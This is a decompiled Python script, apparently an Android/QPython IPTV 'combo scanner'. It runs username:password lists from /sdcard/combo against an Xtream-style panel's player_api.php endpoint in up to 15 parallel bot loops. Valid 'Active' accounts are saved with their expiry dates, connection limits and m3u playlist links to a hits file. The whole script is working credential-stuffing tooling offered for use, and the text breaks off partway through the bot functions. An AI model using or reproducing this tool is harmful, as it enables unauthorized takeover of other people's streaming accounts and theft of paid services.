# uncompyle6 version 3.9.1
# Python bytecode version base 3.6 (3379)
# Decompiled from: Python 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 08:06:12) [MSC v.1900 64 bit (AMD64)]
# Embedded file name: dg
hits = "/sdcard/Hits/A_pxl🅼3🆄✭/"
import os
if not os.path.exists(hits):
    os.mkdir(hits)
else:
    import os, pip
    try:
        import requests
    except:
        print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
        pip.main(["install", "requests"])
        import requests

    import random, time, datetime, subprocess, json, sys, re, base64, pathlib, threading, shutil, logging
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    logging.captureWarnings(True)
    mac = ""
    nick = "by ali  "
    try:
        import cfscrape
        sesq = requests.Session()
        ses = cfscrape.create_scraper(sess=sesq)
    except:
        ses = requests.Session()

    try:
        import androidhelper as sl4a
        ad = sl4a.Android()
    except:
        pass

    pattern = "(^\\S{2,}:\\S{2,}$)|(^.*?(\n|$))"
    say = 0
    hit = 0
    bul = 0
    cpm = 1

    def print_with_delay(text, delay=0.01):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)


    feyzo = "\n \x1b[36m\n  ╔═════════「 🇮🇶 𝐁𝐲 𝐶𝑜𝑛𝑓𝑖𝑔 IQ ════════╗\n  ║    _   _    _   _  _         _     ║\n  ║   /_\\ | |  (_) | || |__ _ __| |__  ║\n  ║  / _ \\| |__| | | __ / _` / _| / /  ║\n  ║ /_/ \\_\\____|_| |_||_\\__,_\\__|_\\_\\  ║\n  ║                                    ║\n  ╚══════════════════════════════╝                                  \n \x1b⠀\x1b[0m\n \x1b[1;91m         ☛ ᴩʏ ᴄᴏɴғɪɴɢ ʙʏ ₐₗᵢ ₐₗₕₑDᵣₑ ☚                     \x1b[0m\n                                                          \n\x1b[0m           \n   \x1b[0;1m"
    print_with_delay(feyzo)
    say = 0
    dsy = ""
    dir = "/sdcard/combo/"
    for files in os.listdir(dir):
        say = say + 1
        dsy = dsy + "    " + str(say) + "-) " + files + "\n"

    print("Choose your combo\n\n" + dsy + "\n\n\x1b[91mCombos found " + str(say) + " Combo No \n")
    dsyno = str(input(" \x1b[36mCombo No =\x1b[0m"))
    say = 0
    for files in os.listdir(dir):
        say = say + 1
        if dsyno == str(say):
            dosyaa = dir + files
            break

    say = 0
    print(feyzo)
    print(dosyaa)
    botsay = input("\n   \x1b[1;96mSpecify the number of bots\x1b[0m\n    \x1b[1;44mEntre 1 to 15\n      \x1b[0m\n      \nBot=")
    botsay = int(botsay)
    HEADERd = {
     'Cookie': '"stb_lang=en; timezone=Europe%2FIstanbul;"', 
     'X-User-Agent': '"Model: MAG254; Link: Ethernet"', 
     'Connection': '"Keep-Alive"', 
     'Accept-Encoding': '"gzip, deflate"', 
     'Accept': '"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"', 
     'User-Agent': '"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"'}
    dsy = dosyaa
    combo = dsy
    dosya = ""
    file = pathlib.Path(dsy)
    if file.exists():
        print("File Found")
    else:
        print("\x1b[31mFile not Found..! \x1b[0m")
    dosya = "yok"
if dosya == "yok":
    exit()
c = open(dsy, "r")
totLen = c.readlines()
uz = len(totLen)
print(feyzo)
print("Bot:" + str(botsay))
dir = "/sdcard/qpython/"
print("\nfile found: " + dsy)
panel = input("\n\x1b[96mEnter your server to scan \n\n\nPanel:Port=\x1b[0m\x1b[33m\x1b[1m")
panel = panel.replace("http://", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
portal = panel
fx = portal.replace(":", "_")
kanall = ""
kanall = input("\nDo you want to include the channel categories?\n1= Yes\n2= No\nYour answer=")
if not kanall == "1":
    kanall = 2
print(feyzo)

def kategori(katelink):
    try:
        res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
        veri = ""
        kate = ""
        veri = str(res.text)
        for i in veri.split('category_name":"'):
            kate = kate + " «🔹🕳🔹» " + str(i.split('"')[0].encode("utf-8").decode("unicode-escape")).replace("\\/", "/")

    except:
        pass

    return kate


def onay(veri, user, pas):
    status = veri.split('status":')[1]
    status = status.split(",")[0]
    status = status.replace('"', "")
    katelink = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_categories"
    sound = "/storage/emulated/0/sound/myriflehit.wav"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = ""
    acon = veri.split('active_cons":')[1]
    acon = acon.split(",")[0]
    acon = acon.replace('"', "")
    mcon = veri.split('max_connections":')[1]
    mcon = mcon.split(",")[0]
    mcon = mcon.replace('"', "")
    timezone = veri.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace("\\/", "/")
    realm = veri.split('url":')[1]
    realm = realm.split(",")[0]
    realm = realm.replace('"', "")
    port = veri.split('port":')[1]
    port = port.split(",")[0]
    port = port.replace('"', "")
    user = veri.split('username":')[1]
    user = user.split(",")[0]
    user = user.replace('"', "")
    passw = veri.split('password":')[1]
    passw = passw.split(",")[0]
    passw = passw.replace('"', "")
    bitis = veri.split('exp_date":')[1]
    bitis = bitis.split(",")[0]
    bitis = bitis.replace('"', "")
    if bitis == "null":
        bitis = "Unlimited"
    else:
        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime("%Y-%m-%d %H:%M:%S")
    bitis = bitis
    if kanall == "1":
        try:
            kategori = ""
            res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
            veri = ""
            kate = ""
            veri = str(res.text)
            for i in veri.split('category_name":"'):
                kate = kate + " 🔹🕳🔹 " + str(i.split('"')[0].encode("utf-8").decode("unicode-escape")).replace("\\/", "/")

            kategori = kate
        except:
            pass

    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
    try:
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        kanalsayisi = ""
        kanalsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        filmsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        dizisayisi = str(veri.count("series_id"))
    except:
        pass

    m3ulink = "http://" + panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
    sayi = ""
    mt = "\n\n⍟🏴▂▂✭𝒜 ℘𝓍ℒ🔱𝒜 ℘𝓍ℒ✭▂▂🏴 \n╭❪❪❪ 🅼3🆄🅟🆁🅾️√4‣𝕊𝕔𝕒𝕟𝕟𝕖𝕣 ❫❫❫\n│                        \n┣━━━━━━🔹\n│  Ⓕⓡⓔⓔ Ⓟⓐⓛⓔⓢⓣⓘⓝⓔ  ⠀\n│⠀⠀⠀⠀⠀⡇⠀\n│⠀⠀⠀⠀⣸⣧⡖\n│⠀⠀⠀⠀⣿⣿⠀\n│⠀⠀⠀⠀⣿⣿⠀\n│⢠⣄⣀⣀⣿⣯⠀\n│⠛⠻⠿⢿⣿⣿⢀\n│⠀⠀⣠⣼⣿⣿⡼\n│⠀⠛⠀⠀⣿⡏⠀\n│⠀⠀⠀⣸⣿⡇⠀\n│⠀⠀⠒⠿⠧⠇⠀⠀                  \n│\n├⧽⧽⧽ ༼シ Iraq ✧ ℙ𝕣𝕖𝕞𝕚𝕦𝕞²ツ༽ ⧼⧼⧼\n├☞ [ @A_pxl ✭ @A_pxl ]\n├─✪  ᴘʏ  ᴄᴏɴғɪɢ  ʙʏ  ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴  ✪\n├──✪ ʜɪᴛꜱ ʙʏ ☞ " + str(nick) + "\n├✪ ℋℴ𝓈𝓉 ➢ http://" + portal + "\n├─✪ ℛℯ𝒶ℓ ➢ http://" + realm + "\n│\n├──⫸🅸🅟🆃🆅●🅟🅻🅐🆈🅴🅡🆂\n│\n├✪ ℘ℴ𝓇𝓉 ➢ " + port + "\n├──✪ 𝒰𝓈ℯ𝓇 ➢ " + user + "\n├─✪ 𝕻𝖆𝖘𝖘 ➢ " + pas + "\n├✭🅼3🆄ᴘʀᴏ #𝐏𝐫𝐞𝐦𝐢𝐮𝐦\n├✪ ℰ𝓍℘𝒾𝓇ℯ ➢ " + bitis + "\n├✪ 𝒜𝓇𝓉 𝒸ℴ𝓃𝓃 ➢ " + acon + "\n├─✪ ℳ𝒶𝓍 𝒸ℴ𝓃𝓃 ➢ " + mcon + "\n├✪ 𝒮𝓉𝒶𝓉𝓊𝓈 ➢ " + status + "\n╰─➤✪ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧➢ " + timezone + "   "
    if not kanalsayisi == "":
        sayi = "\n╭─➤🅼🅴🅳🅸🅰 🅻🅸🆂🆃\n├✦ 𝐋𝐈𝐕𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 ➢ " + kanalsayisi + "\n├✦ 𝐕𝐈𝐃𝐄𝐎𝐒 𝐎𝐍 𝐃𝐄𝐌𝐀𝐍𝐃 ➢ " + filmsayisi + "\n├✦ 𝐓𝐕 𝐒𝐄𝐑𝐈𝐄𝐒 ➢ " + dizisayisi + "\n╰➤[ ᴘʀᴇᴍɪᴜᴍ ᴘʏ ᴄᴏɴғɪɢ ʙʏ ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴ ]  "
    imzak = ""
    if kanall == "1":
        imzak = "\n\n╭❪❪ 🄻🅸🆅🄴✭🄻🅸🆂🆃 ❫❫\n╰─➤{All " + str(kategori) + " "
    mtl = "\n╭⫸ 🔹 🅼3🆄✭🅻🅸🅽🅺\n├➛ [ http://t.m/A_pxl ] √\n╰─➤✭m3u_Url➢" + m3ulink + " "
    yaz(mt + sayi + mtl + imzak + "\n")
    print(mt + sayi + mtl + imzak)


def yaz(kullanici):
    dosya = open(("/sdcard/Hits/A_pxl🅼3🆄✭/" + fx + ".txt"), "a+", encoding="utf-8")
    dosya.write(kullanici)
    dosya.close()


cpm = 0

def echox(user, pas, bot, fyz, oran, hit):
    global cpm
    cpmx = time.time() - cpm
    cpmx = round(60 / cpmx)
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx
    echo = "\n\x1b[0m╭⫷\x1b[36  🅼3🆄🅟🆁🅞☛\u200c🇦\u200c\u200c🇱\u200c\u200c🇮\u200c☚🆂🅲🅰🅽🅽🅴🆁⫸  \n├✪  \x1b[1;32m\x1b[33m PaneL➢ \x1b[0m\x1b[1;36m " + portal + " \x1b[0m    \n├─✪   \x1b[0m\x1b[1m" + user + ":" + pas + "\n├─✪ \x1b[36m  HiT➢" + str(hit) + "²ᯓ★  \x1b[32m \x1b[0m \x1b[1;32m%" + str(oran) + "  \x1b[1;35m CPM➢" + str(cpm) + "ᯓ★  \x1b[0m\n╰───✪   \x1b[36m" + str(bot) + "  \x1b[1;36mTotal➢" + str(fyz) + "   \x1b[0m"
    print(echo)


hit = 0

def hitprint(mac, trh):
    sesdosya = "/sdcard/qpython/gun.mp3"
    file = pathlib.Path(sesdosya)
    try:
        if file.exists():
            ad.mediaPlay(sesdosya)
    except:
        pass

    print("     ✪ 🌟 🇭 🇮 🇹 🌟 ✪    \n")


def d1():
    global hit
    say = 0
    for fyz in range(1, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_01"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("   ✪ 🌟 🇭 🇮 🇹 🌟 ✪                  ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d2():
    global hit
    say = 0
    for fyz in range(2, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_02"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("  ✪ 🌟 🇭 🇮 🇹 🌟 ✪                 ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d3():
    global hit
    say = 0
    for fyz in range(3, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_03"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d4():
    global hit
    say = 0
    for fyz in range(4, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_04"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                  ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d5():
    global hit
    say = 0
    for fyz in range(5, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_05"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d6():
    global hit
    say = 0
    for fyz in range(6, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_06"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d7():
    global hit
    say = 0
    for fyz in range(7, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_07"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("  ✪ 🌟 🇭 🇮 🇹 🌟 ✪                  ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d8():
    global hit
    say = 0
    for fyz in range(8, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_08"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d9():
    global hit
    say = 0
    for fyz in range(9, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_09"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("  ✪ 🌟 🇭 🇮 🇹 🌟 ✪                  ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d10():
    global hit
    say = 0
    for fyz in range(10, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_10"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d11():
    global hit
    say = 0
    for fyz in range(11, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_11"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d12():
    global hit
    say = 0
    for fyz in range(12, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_12"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                 ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d13():
    global hit
    say = 0
    for fyz in range(13, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_13"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("      ✪ 🌟 🇭 🇮 🇹 🌟 ✪                  ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d14():
    global hit
    say = 0
    for fyz in range(14, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_14"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
